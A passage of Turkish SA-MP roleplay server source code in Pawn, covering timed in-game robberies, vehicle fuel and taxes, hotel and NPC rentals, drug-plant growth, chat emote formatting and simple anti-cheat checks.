		                DoGonder(i, 20.0, "Ýþyerinin kapýsý kýrýldý.");
		                Isyeri[GetPVarInt(i, "KapiID")][ikilit] = 0;
		            }
		        }
		    }
		}
		if(GetPVarInt(i, "SoygunSure") > 0)
		{
		    SetPVarInt(i, "SoygunSure", GetPVarInt(i, "SoygunSure")-1);
		    new mstring[4];
		    format(mstring, sizeof(mstring), "%d", GetPVarInt(i, "SoygunSure"));
		    PlayerTextDrawSetString(i, GeriSayimTD[i], mstring);
		    if(GetPVarInt(i, "SoygunSure") == 30)
		    {
		        PlayerTextDrawHide(i, GeriSayimTD[i]);
		        new _id = GetPVarInt(i, "SoygunID");
		        if(i == Soygun[_id][lider])
				{
				    Bilgi(i, "Kasanýn 1/3'ünü soydunuz.");
				    GivePlayerCash(i, randomEx(250,500));
				    if(Soygun[_id][oyuncu2] != -1) { GivePlayerCash(Soygun[_id][oyuncu2], randomEx(250,500)); Bilgi(Soygun[_id][oyuncu2], "Kasanýn 1/3'ünü soydunuz."); }
				    if(Soygun[_id][oyuncu3] != -1) { GivePlayerCash(Soygun[_id][oyuncu3], randomEx(250,500)); Bilgi(Soygun[_id][oyuncu3], "Kasanýn 1/3'ünü soydunuz."); }
				    if(Soygun[_id][oyuncu4] != -1) { GivePlayerCash(Soygun[_id][oyuncu4], randomEx(250,500)); Bilgi(Soygun[_id][oyuncu4], "Kasanýn 1/3'ünü soydunuz."); }
				    if(Soygun[_id][oyuncu5] != -1) { GivePlayerCash(Soygun[_id][oyuncu5], randomEx(250,500)); Bilgi(Soygun[_id][oyuncu5], "Kasanýn 1/3'ünü soydunuz."); }
				}
		    }
		    else if(GetPVarInt(i, "SoygunSure") == 15)
		    {
		        PlayerTextDrawHide(i, GeriSayimTD[i]);
		        new _id = GetPVarInt(i, "SoygunID");
		        if(i == Soygun[_id][lider])
				{
				    Bilgi(i, "Kasanýn 2/3'ünü soydunuz.");
				    GivePlayerCash(i, randomEx(500,750));
				    if(Soygun[_id][oyuncu2] != -1) { GivePlayerCash(Soygun[_id][oyuncu2], randomEx(500,750)); Bilgi(Soygun[_id][oyuncu2], "Kasanýn 2/3'ünü soydunuz."); }
				    if(Soygun[_id][oyuncu3] != -1) { GivePlayerCash(Soygun[_id][oyuncu3], randomEx(500,750)); Bilgi(Soygun[_id][oyuncu3], "Kasanýn 2/3'ünü soydunuz."); }
				    if(Soygun[_id][oyuncu4] != -1) { GivePlayerCash(Soygun[_id][oyuncu4], randomEx(500,750)); Bilgi(Soygun[_id][oyuncu4], "Kasanýn 2/3'ünü soydunuz."); }
				    if(Soygun[_id][oyuncu5] != -1) { GivePlayerCash(Soygun[_id][oyuncu5], randomEx(500,750)); Bilgi(Soygun[_id][oyuncu5], "Kasanýn 2/3'ünü soydunuz."); }
				}
		    }
		    else if(GetPVarInt(i, "SoygunSure") == 0)
		    {
		        PlayerTextDrawHide(i, GeriSayimTD[i]);
		        new _id = GetPVarInt(i, "SoygunID");
		        if(i == Soygun[_id][lider])
				{
				    Bilgi(i, "Kasanýn tamamýný baþarýyla soydunuz.");
				    GivePlayerCash(i, randomEx(500,750));
				    if(Soygun[_id][oyuncu2] != -1) { GivePlayerCash(Soygun[_id][oyuncu2], randomEx(500,750)); Bilgi(Soygun[_id][oyuncu2], "Kasanýn tamamýný baþarýyla soydunuz."); }
				    if(Soygun[_id][oyuncu3] != -1) { GivePlayerCash(Soygun[_id][oyuncu3], randomEx(500,750)); Bilgi(Soygun[_id][oyuncu3], "Kasanýn tamamýný baþarýyla soydunuz."); }
				    if(Soygun[_id][oyuncu4] != -1) { GivePlayerCash(Soygun[_id][oyuncu4], randomEx(500,750)); Bilgi(Soygun[_id][oyuncu4], "Kasanýn tamamýný baþarýyla soydunuz."); }
				    if(Soygun[_id][oyuncu5] != -1) { GivePlayerCash(Soygun[_id][oyuncu5], randomEx(500,750)); Bilgi(Soygun[_id][oyuncu5], "Kasanýn tamamýný baþarýyla soydunuz."); }
                    KillTimer(SoygunTextTimer[i]);
			        IsyeriSoyuluyor[Soygun[i][isyerid]] = false;
			        SoygunTextGizle(Soygun[i][lider]);
					Soygun[i][lider] = -1;
					if(Soygun[_id][oyuncu2] != -1) { KillTimer(SoygunTextTimer[Soygun[i][oyuncu2]]), SoygunTextGizle(Soygun[i][oyuncu2]); }
	                Soygun[i][oyuncu2] = -1;
					if(Soygun[_id][oyuncu3] != -1) { KillTimer(SoygunTextTimer[Soygun[i][oyuncu3]]), SoygunTextGizle(Soygun[i][oyuncu3]); }
	                Soygun[i][oyuncu3] = -1;
					if(Soygun[_id][oyuncu4] != -1) { KillTimer(SoygunTextTimer[Soygun[i][oyuncu4]]), SoygunTextGizle(Soygun[i][oyuncu4]); }
	                Soygun[i][oyuncu4] = -1;
					if(Soygun[_id][oyuncu5] != -1) { KillTimer(SoygunTextTimer[Soygun[i][oyuncu5]]), SoygunTextGizle(Soygun[i][oyuncu5]); }
	                Soygun[i][oyuncu5] = -1;
					Soygun[i][isyerid] = -1;
					Soygun[i][isyeritip] = -1;
					foreach(new ixx : Player)
					{
					    if(Birlik[Karakter[ixx][birlik]][ftip] == LSPD)
					    {
					        RemovePlayerMapIcon(ixx, i);
					    }
					}
				}
		    }
		}
	}
	dortsaniye++;
	if(dortsaniye == 4)
	{
	    SetNumsCars();
		foreach(new i : Player)
		{
	    	if(bunnyhop[i] != 0)
	    	{
    	 		bunnyhop[i] = 0;
			}
			static vid;
			if(IsPlayerInAnyVehicle(i) && GetPlayerState(i) == PLAYER_STATE_DRIVER)
			{
				vid=GetPlayerVehicleID(i);
			    if(Arac[vid][abenzin] > 0 && Arac[vid][abenzin] < 101 && GetMotor(vid) == 1 && Arac[vid][abirliktip] != LSPD && Arac[vid][abirliktip] != ASMS && Arac[vid][abirliktip] != LSFD && Arac[vid][abirliktip] != FBI && Arac[vid][atip] != 3 && Arac[vid][atip] != 4 && Arac[vid][atip] != 7 && Arac[vid][atip] != 6 && Arac[vid][atip] != 8 && Arac[vid][atip] != 9 && !IsABike(vid) && GetVehicleModel(vid) != 437)
		  		{
					Arac[vid][abenzin] -= 0.10;
				}
			}
			if(Girdi[i]) {
                static mmstring[128];
				format(mmstring, sizeof(mmstring), "$%d", Karakter[i][banka]);
			    PlayerTextDrawSetString(i, BankaParaTD[i], mmstring);
			}
		}
	    dortsaniye = 0;
	}
	otuzsaniye++;
	if(otuzsaniye == 30)
	{
		foreach(new i : Player)
		{
            if(IsPlayerBleeding(i))
            {
				SetPlayerHealth(i, HpBul(i)-1);
			}
            static day, year, month, hours, minute, sec, mmstring[128];
		    getdate(year, month, day);
		    gettime(hours, minute, sec);
		    format(mmstring, sizeof(mmstring), "%02d-%02d-%02d_%02d:%02d", day, month, year-2000, hours, minute);
		    PlayerTextDrawSetString(i, SaatTD[i], mmstring);
		    format(mmstring, sizeof(mmstring), "%ddk", Karakter[i][payday]);
		    PlayerTextDrawSetString(i, PaydaySureTD[i], mmstring);
		}
		otuzsaniye = 0;
	}
	dakikasure++;
	if(dakikasure == 60)
	{
	    for(new i=0;i<240;i++) {
			if(Otel[i][osure] > 0)
			    Otel[i][osure]--;
			if(Otel[i][osure] == 3) {
				foreach(new ix : Player) {
					if(Otel[i][osahip] == Karakter[ix][sqlid]) {
						Bilgi(ix, "Otel odanýzýn süresi doldu, 2 dakika içerisinde odanýz kilitlenicek.");
					}
				}
			}
			if(Otel[i][osure] == 2) {
				foreach(new ix : Player) {
					if(Otel[i][osahip] == Karakter[ix][sqlid]) {
						Bilgi(ix, "Otel odanýzýn süresi doldu, 1 dakika içerisinde odanýz kilitlenicek.");
					}
				}
			}
			if(Otel[i][osure] == 1) {
				Otel[i][osahip] = 0;
				Otel[i][kilitli] = true;
			}
		}
	    for(new i;i<MAX_NPC;i++)
		{
		    if(IsValidDynamicActor(NPC[i][nid]) && NPC[i][nsahip] != 0)
		    {
				if(NPC[i][nsure] > 0)
				{
				    NPC[i][nsure]--;
				    if(NPC[i][nsure] == 0)
					{
					    foreach(new ix : Player)
					    {
					        if(Karakter[ix][sqlid] == NPC[i][nsahip])
					        {
					            new _mstring[64];
					            format(_mstring, sizeof(_mstring), "%d idli NPC'nizin kira süresi doldu.",i);
					            Bilgi(ix, _mstring);
					        }
					    }
					    DestroyDynamicActor(NPC[i][nid]);
					    NPC[i][nsahip] = 0;
					    format(NPC[i][nad], 32, "Yok");
					    DestroyDynamic3DTextLabel(NPC[i][nadtext]);
					    DestroyDynamic3DTextLabel(NPC[i][nyazitext]);
					}
				}
		    }
		}
	    for(new a; a < MAX_VEHICLES; a++)
	    {
	        if(IsValidVehicle(a))
	        {
				if(IsABike(a))
				{
				    new engine, lights, alarm, doors, bonnet, boot, objective;
					GetVehicleParamsEx(a, engine, lights, alarm, doors, bonnet, boot, objective);
					if(engine == 0 || doors == 1)
				    	SetVehicleParamsEx(a, 1, 0, 0, 0, 0, 0, 0);
				}
	            if(Arac[a][atip] == 5)
	            {
	                if(Arac[a][asure] > 0)
					{
						Arac[a][asure]--;
		                if(Arac[a][asure] <= 0)
		                {
		                    Arac[a][aowner] = -1;
		                    Arac[a][asure] = 0;
		                    Arac[a][akilit] = 0;
		                    Arac[a][abenzin] = 100;
		                    Aractamiri(a);
		                    SetVehicleToRespawn(a);
		                }
					}
	            }
	        }
	    }
	    for(new ui = 0; ui < MAX_DRUGS; ui++)
	    {
	        if(Uyusturucu[ui][utip] != 0)
	        {
	            Uyusturucu[ui][udakika]++;
	            if(Uyusturucu[ui][udakika] == 50 && Uyusturucu[ui][udurum] == 0) Uyusturucu[ui][udurum] = 3;
	            if(Uyusturucu[ui][udakika] == 71 && Uyusturucu[ui][udurum] == 3) Uyusturucu[ui][udurum] = 2;
	            if(Uyusturucu[ui][udakika] == 110 && Uyusturucu[ui][udurum] == 0) Uyusturucu[ui][udurum] = 3;
	            if(Uyusturucu[ui][udakika] == 131 && Uyusturucu[ui][udurum] == 3) Uyusturucu[ui][udurum] = 2;
	            if(Uyusturucu[ui][udakika] == 180 && Uyusturucu[ui][udurum] == 0) Uyusturucu[ui][udurum] = 1;
	            if(Uyusturucu[ui][udakika] == 190 && Uyusturucu[ui][udurum] == 1) Uyusturucu[ui][udurum] = 2;
	            new _mstring[64],_utext[10];
	            if(Uyusturucu[ui][utip] == 1) _utext = "Esrar";
	            if(Uyusturucu[ui][utip] == 2) _utext = "Kokain";
	            if(Uyusturucu[ui][utip] == 3) _utext = "Eroin";
	            new _dk=Uyusturucu[ui][udakika];
	            if(180 <= _dk <= 190)_dk=180;
	            if(_dk>190)_dk=0;
	            format(_mstring, sizeof(_mstring), "%s\n%d%",_utext,floatround((_dk*100)/180));
	            if(Uyusturucu[ui][udurum] == 3) format(_mstring, sizeof(_mstring), "**Su Ýhtiyacý Var.\n%s\n%d%",_utext,floatround((_dk*100)/180));
	            if(Uyusturucu[ui][udurum] == 1) format(_mstring, sizeof(_mstring), "**Toplanmaya Hazýr.\n%s\n%d%",_utext,floatround((_dk*100)/180));
	            if(Uyusturucu[ui][udurum] == 2) format(_mstring, sizeof(_mstring), "**Çürümüþ.\n%s\n%d%",_utext,floatround((_dk*100)/180));
	            if(Uyusturucu[ui][utip] != 0)
				{
				    if(IsValidDynamic3DTextLabel(Uyusturucu[ui][ulabel])) DestroyDynamic3DTextLabel(Uyusturucu[ui][ulabel]);
					Uyusturucu[ui][ulabel] = CreateDynamic3DTextLabel(_mstring, COLOR_YELLOW,  Uyusturucu[ui][ux], Uyusturucu[ui][uy], Uyusturucu[ui][uz], 5, .worldid=Uyusturucu[ui][uvworld], .interiorid=Uyusturucu[ui][uinterior]);
				}
	            UyusturucuKaydet(ui);
	        }
	    }
	    dakikasure = 0;
	}
    saatsure++;
	if(saatsure == 3600)
	{
		for(new i;i<MAX_VEHICLES;i++)
		{
		 	if(Arac[i][vergi] > floatround(Arac[i][afiyat]/20)) continue;
		 	if(Arac[i][atip] != 1 && Arac[i][atip] != 2 && Arac[i][atip] != 10 && Arac[i][atip] != 5) continue;
			static _vergi;
			if(Arac[i][atip] == 10) _vergi = floatround(Arac[i][afiyat]/1000);
			else _vergi = floatround(Arac[i][afiyat]/2000);
			Arac[i][vergi] += _vergi;
			AracKaydet(i);
		}
		foreach(new i : Business) {
			if(Isyeri[i][ivergi] > floatround((Isyeri[i][ifiyat]*35)/100)) continue;
			if(Isyeri[i][isahip] == -1 || Isyeri[i][isahip] == 10) continue;
			Isyeri[i][ivergi] += IsyeriVergi(i);
			IsyeriKaydet(i);
		}
 		saatsure = 0;
	}
	foreach(new i : Player)
    {
        /*
		if(IsPlayerConnected(i))
		{
		    if(Karakter[i][utedavidurum] >= 1)
		    {
		        Karakter[i][utedavidurum]--;
		    }
		}*/
  		if(IsPlayerConnected(i))
		{
			// telefon
            if(Arama[i][2] != 0)
	        {
	            new sure[16], saniye, dakika, dakikastr[16], saniyestr[16];
	            Arama[i][3]++;
	            if(Arama[i][3] >= 60)
				{
					saniye = Arama[i][3] % 60;
					dakika = Arama[i][3]/60;
				}
				else saniye = Arama[i][3];
				if(saniye < 10) format(saniyestr, sizeof(saniyestr), "0%d", saniye);
				if(saniye >= 10) format(saniyestr, sizeof(saniyestr), "%d", saniye);
				if(dakika < 10) format(dakikastr, sizeof(dakikastr), "0%d", dakika);
				if(dakika >= 10) format(dakikastr, sizeof(dakikastr), "%d", dakika);
				format(sure, sizeof(sure), "%s:%s", dakikastr, saniyestr);
				PlayerTextDrawSetString(i, rty[i][33], sure);
	        }
			// telefon
			new Float:oldposx, Float:oldposy, Float:oldposz;
			GetPlayerPos(i, oldposx, oldposy, oldposz);
		    if(oldposx != 0.0 && oldposy != 0.0 && oldposz != 0.0)
		    {
		    	foreach(new _iisid : Business)
		        {
		        	if(PlayerToPoint(1.0, i, Isyeri[_iisid][girisX], Isyeri[_iisid][girisY], Isyeri[_iisid][girisZ]))
		            {
		            	if(GetPlayerVirtualWorld(i) == Isyeri[_iisid][igirisvw])
		                {
		                    if(Isyeri[_iisid][isahip] == 9 || Isyeri[_iisid][isahip] == 10)
		                    {
			                	if(Isyeri[_iisid][isahip] == -1)
			                    {
			                    	format(string, sizeof(string), "~r~%s~n~~w~$%d~n~Satilik", Isyeri[_iisid][iad], Isyeri[_iisid][ifiyat]);
			                        GameTextForPlayer(i, string, 3000, 1);
								}
								else
								{
									format(string, sizeof(string), "~r~%s~n~~w~%s", Isyeri[_iisid][iad], SQLFromName(Isyeri[_iisid][isahip]));
									if(Isyeri[_iisid][kira] == 1) format(string, sizeof(string), "~r~%s~n~~w~%s~n~~w~Kiralik: ~g~$~w~%d", Isyeri[_iisid][iad], SQLFromName(Isyeri[_iisid][isahip]), Isyeri[_iisid][kirafiyat]);
	                                if(Isyeri[_iisid][girisucreti] > 0 && Isyeri[_iisid][kira] == 0) format(string, sizeof(string), "~r~%s~n~~w~%s~n~Giris: ~g~$~w~%d", Isyeri[_iisid][iad], SQLFromName(Isyeri[_iisid][isahip]),Isyeri[_iisid][girisucreti]);
	                                if(Isyeri[_iisid][girisucreti] > 0 && Isyeri[_iisid][kira] == 1) format(string, sizeof(string), "~r~%s~n~~w~%s~n~~w~Kiralik: ~g~$~w~%d~n~~w~Giris: ~g~$~w~%d", Isyeri[_iisid][iad], SQLFromName(Isyeri[_iisid][isahip]),Isyeri[_iisid][kirafiyat],Isyeri[_iisid][girisucreti]);
									if(Isyeri[_iisid][kiralayan] != -1) format(string, sizeof(string), "~r~%s~n~~w~%s", Isyeri[_iisid][iad], SQLFromName(Isyeri[_iisid][kiralayan]));
									GameTextForPlayer(i, string, 3000, 1);
								}
							}
						}
					}
				}
			}
			// araç göstergeleri
			if(IsPlayerInAnyVehicle(i))
			{
				new vid = GetPlayerVehicleID(i);
				if(!IsValidVehicle(vid)) continue;
				if(Arac[vid][abenzin] > 100)
				    Arac[vid][abenzin] = 100.0;
				akmm[i] = GetPlayerSpeedTest(i);
			    Arac[vid][ametre] += (akmm[i]*10)/36;
				if(Arac[vid][abenzin] <= 0.4)
				{
				    Arac[vid][abenzin] = 0;
				    if(IsPlayerConnected(GetVehicleDriver(vid))) Bilgi(GetVehicleDriver(vid), "Aracýnýzýn benzini bitti.");
				    MotoruKapat(vid);
				}
			    Taksimetre[vid][3] += (akmm[i]*10)/36;
			    if(Arac[vid][ametre] > 499)
				{
					Arac[vid][akm] += 1;
					Arac[vid][ametre] = 0;
				}
				if((Arac[vid][amodel] == 438 || Arac[vid][amodel] == 420) && Taksimetre[vid][0] && Taksimetre[vid][3] >= 50)
				{
				    Taksimetre[vid][3] = 0;
				 	Taksimetre[vid][1] += Taksimetre[vid][2];
					format(string, 64, "$%d", Taksimetre[vid][1]);
					if(!GetPVarInt(i, "TaksimetreGizle")) PlayerTextDrawSetString(i, TaksimetreTD[i], string);
				}
				format(string, 64, "%dkm/h", akmm[i]);
				if(!GetPVarInt(i, "HizGizle")) PlayerTextDrawSetString(i, HizTD[i], string);
				format(string, 64, "%.1flt", Arac[vid][abenzin]);
				if(!GetPVarInt(i, "BenzinGizle")) PlayerTextDrawSetString(i, BenzinTD[i], string);
				format(string, 64, "%dkm", Arac[vid][akm]);
				if(!GetPVarInt(i, "KmGizle")) PlayerTextDrawSetString(i, KmTD[i], string);
				if(GetPVarInt(i, "TGorev") == 1 && GetVehicleModel(GetPlayerVehicleID(i)) == 574)
				{
				    TemizlikYol[i] += floatround((akmm[i]*10)/36);
				}
				if(!GetMotor(vid))
				{
					if(akmm[i] > 40 && Arac[vid][aowner] != Karakter[i][sqlid] && !AracAnahtarKontrol(i,vid))
					{
					    format(string, sizeof(string), "[ANTÝ-HÝLE] %s(%d) sahibi olmadýðý bir aracý motoru açmadan kullandý.", OyuncuAdiniBul(i), i);
						EkibeYollaDuty(COLOR_ORANGE, string, 1);
					}
				}
			}
		}
	}
}

forward split(const strsrc[], strdest[][], delimiter, dasd);
public split(const strsrc[], strdest[][], delimiter, dasd)
{
	new i, li;
	new aNum;
	new len;
	while(i <= strlen(strsrc)){
	    if(strsrc[i]==delimiter || i==strlen(strsrc)){
	        len = strmid(strdest[aNum], strsrc, li, i, dasd);
	        strdest[aNum][len] = 0;
	        li = i+1;
	        aNum++;
		}
		i++;
	}
	return 1;
}
forward MotoruKapat(vid);
public MotoruKapat(vid)
{
	if(IsValidVehicle(vid))
	{
		new engine,lights,alarm,doors,bonnet,boot,objective;
		GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
		MotoruAciliyor[vid] = false;
	}
}
forward MotoruAc(vid, playerid);
public MotoruAc(vid, playerid)
{
	new Float:vhp;
	GetVehicleHealth(vid, vhp);
	if(IsValidVehicle(vid))
	{
	    if(Arac[vid][abenzin] < 1)
	    {
			MotoruAciliyor[vid] = false;
			Hata(playerid, "Aracýnýzýn benzini yok! 7/24'lerden benzin bidonu satýn alarak deponuzu doldurabilirsiniz.");

			return 1;
		}
	    if(vhp < 350.0)
	    {
			MotoruAciliyor[vid] = false;
			Hata(playerid, "Aracýnýzýn motoru çalýþtýrýlamayacak kadar hasarlý.");
			return 1;
		}
        MotoruAciliyor[vid] = false;
		new engine,lights,alarm,doors,bonnet,boot,objective;
		GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
	}
	return 1;
}

forward UyusturucuEtki(playerid);
public UyusturucuEtki(playerid)
{
	SetPlayerWeather(playerid, 1);
	SetPlayerDrunkLevel(playerid, 0);
	return 1;
}

forward UnfreezeTimer(playerid);
public UnfreezeTimer(playerid) return TogglePlayerControllable(playerid, 1);

forward GirisKontrol(playerid);
public GirisKontrol(playerid)
{
	if(!Girdi[playerid]) Kick(playerid);
	return 1;
}
public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{
	if(Debug) printf("OnPlayerWeaponShot(%d, %d, %d, %d, %f, %f, %f)",playerid, weaponid, hittype, hitid, fX, fY, fZ);
    if( hittype != BULLET_HIT_TYPE_NONE )
	{
        if( !( -1000.0 <= fX <= 1000.0 ) || !( -1000.0 <= fY <= 1000.0 ) || !( -1000.0 <= fZ <= 1000.0 ) )
		{
			return 0;
		}
	}
	if(IsPlayerConnected(playerid) && WeaponUniqueID[playerid][weaponid] != 0 && Birlik[Karakter[playerid][birlik]][ftip] != LSPD && Birlik[Karakter[playerid][birlik]][ftip] != LSPA)
	{
		if(!(-10 < PlayerAmmo[playerid][weaponid] - GetPlayerAmmo(playerid) < 10))
		{
			new player_name[MAX_PLAYER_NAME];
			GetPlayerName(playerid, player_name, MAX_PLAYER_NAME);
   			ResetPlayerWeapons(playerid);
			printf("[AMMO HACK] %d kicked - ammo: %d/%d", player_name, PlayerAmmo[playerid][weaponid], GetPlayerAmmo(playerid));
			return Kick(playerid);
		}
	}
	new Float:x, Float:y, Float:z;
 	GetPlayerPos(playerid, x, y, z);
    //Desync weapon IDs that don't fire bullets
    if (weaponid < 22 || weaponid > 38)
		return 0;

    //Desync shots with Z pos out of bounds
    if(!(-20000.0 <= z <= 20000.0))
	    return 0;
	return 1;
}

forward MeGonderEx(playerid,Float:radius,message[]);
public MeGonderEx(playerid,Float:radius,message[])
{
    new len = strlen(message);
	new count;
	new xlen, bool:xlenex;
	new bul=0;
	count = strcount(message, "\"");
	if(count == 2)
	{
	    for(new i= 0;i<256;i++)
		{
	    	if(message[i] == '"' && bul == 0)
	    	{
	    	    strins(message, "{FFFFFF}", i, len);
	    	    bul = 1;
	    	    if(i > 80)
	    	    {
	    	        xlen = i-1;
	    	        xlenex = true;
	    	    }
	    	    continue;
			}
			if(message[i] == '"' && message[i-1] != '}')
			{
			    len = strlen(message);
			    strins(message, "{c2a2da}", i+1, len);
				bul = 0;
				if(!xlenex) xlen = i+9;
			    break;
			}
		}
	}
	new toxt[3][128], string[128];
	new bool:xxxx=false;
	if(count == 2) {
		TextBol(message,toxt,xlen);
		if(strcount(toxt[0], "\"") == 1 && strcount(toxt[1], "\"") == 1) { xxxx=true; }
	}
	else TextBol(message,toxt,60);
	format(string, sizeof(string), "%s ...", toxt[0]);
	format(string, sizeof(string), "* %s %s", OyuncuAdiniBul(playerid), string);
	ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	format(string, sizeof(string), "... %s", toxt[1]);
	if(xxxx) format(string, sizeof(string), "* %s {FFFFFF}%s", OyuncuAdiniBul(playerid), string);
	else format(string, sizeof(string), "* %s %s", OyuncuAdiniBul(playerid), string);
	ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return 1;
}
forward MeGonder(playerid,Float:radius,message[]);
public MeGonder(playerid,Float:radius,message[])
{
    new len = strlen(message);
	new count;
	new bul=0;
	count = strcount(message, "\"");
	if(count == 2)
	{
	    for(new i= 0;i<256;i++)
		{
	    	if(message[i] == '"' && bul == 0)
	    	{
	    	    strins(message, "{FFFFFF}", i, len);
	    	    bul = 1;
	    	    continue;
			}
			if(message[i] == '"' && message[i-1] != '}')
			{
			    len = strlen(message);
			    strins(message, "{c2a2da}", i+1, len);
				bul = 0;
			    break;
			}
		}
	}
	new string[128];
	format(string, sizeof(string), "* %s %s", OyuncuAdiniBul(playerid), message);
	ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return 1;
}
forward MeGonderArac(playerid,Float:radius,message[]);
public MeGonderArac(playerid,Float:radius,message[])
{
    new len = strlen(message);
	new count;
	new bul=0;
	count = strcount(message, "\"");
	if(count == 2)
	{
	    for(new i= 0;i<256;i++)
		{
	    	if(message[i] == '"' && bul == 0)
	    	{
	    	    strins(message, "{FFFFFF}", i, len);
	    	    bul = 1;
	    	    continue;
			}
			if(message[i] == '"' && message[i-1] != '}')
			{
			    len = strlen(message);
			    strins(message, "{c2a2da}", i+1, len);
				bul = 0;
			    break;
			}
		}
	}
	new string[128];
	format(string, sizeof(string), "» %s %s", OyuncuAdiniBul(playerid), message);
	ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return 1;
}

forward ZarMesaj(playerid, Float:radius, message[]);
public ZarMesaj(playerid, Float:radius, message[])
{
	new string[128];
	format(string, sizeof(string), "* %s zar attý. (( %s ))", OyuncuAdiniBul(playerid), message);
	ProxDetector(15.0, playerid, string,COLOR_DO,COLOR_DO,COLOR_DO,COLOR_DO,COLOR_DO);
	return 1;
}
forward TkmMesaj(playerid, Float:radius, message[]);
public TkmMesaj(playerid, Float:radius, message[])
{
	new string[128];
	format(string, sizeof(string), "* %s (( %s [TKM] ))", message, OyuncuAdiniBul(playerid));
	ProxDetector(15.0, playerid, string,COLOR_DO,COLOR_DO,COLOR_DO,COLOR_DO,COLOR_DO);
	return 1;
}
forward ZarMesajGizli(playerid, _pid, message[]);
public ZarMesajGizli(playerid, _pid, message[])
{
	new string[128];
	format(string, sizeof(string), "* %s zar attý. (( %s ))", OyuncuAdiniBul(playerid), message);
	SendClientMessage(playerid, COLOR_DO, string);
	SendClientMessage(_pid, COLOR_DO, string);
	return 1;
}
forward RuletMesaj(playerid, Float:radius, message[]);
public RuletMesaj(playerid,Float:radius,message[])
{
	new string[128];
	format(string, sizeof(string), "* %s (( %s [RULET] ))", message, OyuncuAdiniBul(playerid));
	ProxDetector(15.0, playerid, string,COLOR_DO,COLOR_DO,COLOR_DO,COLOR_DO,COLOR_DO);
	return 1;
}forward YaziTura(playerid, Float:radius, message[]);
public YaziTura(playerid,Float:radius,message[])
{
	new string[128];
	format(string, sizeof(string), "* %s (( %s [YAZI-TURA] ))", message, OyuncuAdiniBul(playerid));
	ProxDetector(15.0, playerid, string,COLOR_DO,COLOR_DO,COLOR_DO,COLOR_DO,COLOR_DO);
	return 1;
}
forward DoGonderEx(playerid,Float:radius,message[]);
public DoGonderEx(playerid,Float:radius,message[])
{
    new len = strlen(message);
	new count;
	new xlen, bool:xlenex;
	new bul=0;
	count = strcount(message, "\"");
	if(count == 2)
	{
	    for(new i= 0;i<256;i++)
		{
	    	if(message[i] == '"' && bul == 0)
	    	{
	    	    strins(message, "{FFFFFF}", i, len);
	    	    bul = 1;
	    	    if(i > 80)
	    	    {
	    	        xlen = i-1;
	    	        xlenex = true;
	    	    }
	    	    continue;
			}
			if(message[i] == '"' && message[i-1] != '}')
			{
			    len = strlen(message);
			    strins(message, "{00BF8A}", i+1, len);
				bul = 0;
				if(!xlenex) xlen = i+9;
			    break;
			}
		}
	}
	new toxt[3][128], string[128];
	new bool:xxxx=false;
	if(count == 2) {
		TextBol(message,toxt,xlen);
		if(strcount(toxt[0], "\"") == 1 && strcount(toxt[1], "\"") == 1) { xxxx=true; }
	}
	else TextBol(message,toxt,60);
	format(string, sizeof(string), "%s ...", toxt[0]);
	format(string, sizeof(string), "* %s (( %s ))", string, OyuncuAdiniBul(playerid));
	ProxDetector(15.0, playerid, string, COLOR_DO,COLOR_DO,COLOR_DO,COLOR_DO,COLOR_DO);
	format(string, sizeof(string), "... %s", toxt[1]);
	if(xxxx) format(string, sizeof(string), "* {FFFFFF}%s (( %s ))", string, OyuncuAdiniBul(playerid));
	else format(string, sizeof(string), "* %s (( %s ))", string, OyuncuAdiniBul(playerid));
	ProxDetector(15.0, playerid, string, COLOR_DO,COLOR_DO,COLOR_DO,COLOR_DO,COLOR_DO);

	return 1;
}
forward DoGonder(playerid,Float:radius,message[]);
public DoGonder(playerid,Float:radius,message[])
{
	new len = strlen(message);
	new count;
	new bul=0;
	count = strcount(message, "\"");
	if(count == 2)
	{
	    for(new i= 0;i<256;i++)
		{
	    	if(message[i] == '"' && bul == 0)
	    	{
	    	    strins(message, "{FFFFFF}", i, len);
	    	    bul = 1;
	    	    continue;
			}
			if(message[i] == '"' && message[i-1] != '}')
			{
			    len = strlen(message);
			    strins(message, "{00BF8A}", i+1, len);
				bul = 0;
			    break;
			}
		}
	}
	new string[128];
	format(string, sizeof(string), "* %s (( %s ))", message, OyuncuAdiniBul(playerid));
	ProxDetector(15.0, playerid, string,COLOR_DO,COLOR_DO,COLOR_DO,COLOR_DO,COLOR_DO);
	return 1;
}
forward ProxDetectorS(Float:radi, playerid, targetid);
public ProxDetectorS(Float:radi, playerid, targetid)
{
    if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
	{

		new Float:sposx, Float:sposy, Float:sposz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		//radi = 2.0; //Trigger Radius
		GetPlayerPos(targetid, sposx, sposy, sposz);
		tempposx = (oldposx -sposx);
		tempposy = (oldposy -sposy);
		tempposz = (oldposz -sposz);
		//printf("DEBUG: X:%f Y:%f Z:%f",posx,posy,posz);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return 1;
		}
	}
	return 0;
}
forward ProxDetectorEx(Float:radi, playerid, string[],col1,col2,col3,col4,col5,tip);
public ProxDetectorEx(Float:radi, playerid, string[],col1,col2,col3,col4,col5,tip)
{
	if(IsPlayerConnected(playerid))
	{

		new Float:sposx, Float:sposy, Float:sposz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
